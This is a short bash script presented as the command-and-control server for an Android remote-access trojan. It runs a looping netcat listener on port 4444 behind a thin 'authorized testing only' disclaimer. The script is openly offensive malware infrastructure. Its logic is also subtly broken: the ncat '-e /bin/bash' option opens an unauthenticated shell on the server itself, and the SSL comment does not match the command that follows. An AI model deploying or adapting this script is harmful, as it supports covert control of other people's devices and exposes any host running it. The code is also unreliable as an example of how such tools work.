#!/bin/bash
# android-rat-bash - C2 Server
# Author: Cyber Security Engineer Project
# For authorized security testing only

HOST="0.0.0.0"
PORT="4444"
LOGDIR="./logs"
mkdir -p "$LOGDIR"

cleanup() {
    echo -e "\n[+] Shutting down..."
    kill 0 2>/dev/null
}
trap cleanup INT TERM

banner() {
    clear
    echo "=============================================="
    echo "   ANDROID ADMINISTRATION SHELL - SERVER"
    echo "=============================================="
    echo " Listening on $HOST:$PORT"
    echo "=============================================="
}

banner

while true; do
    echo "[*] Waiting for connection..."
    # ncat for SSL option; use plain nc if not available
    ncat -lvp "$PORT" -e /bin/bash 2>/dev/null ||
    nc -lvp "$PORT" 2>/dev/null
    echo "[!] Session ended. Restarting listener..."
done
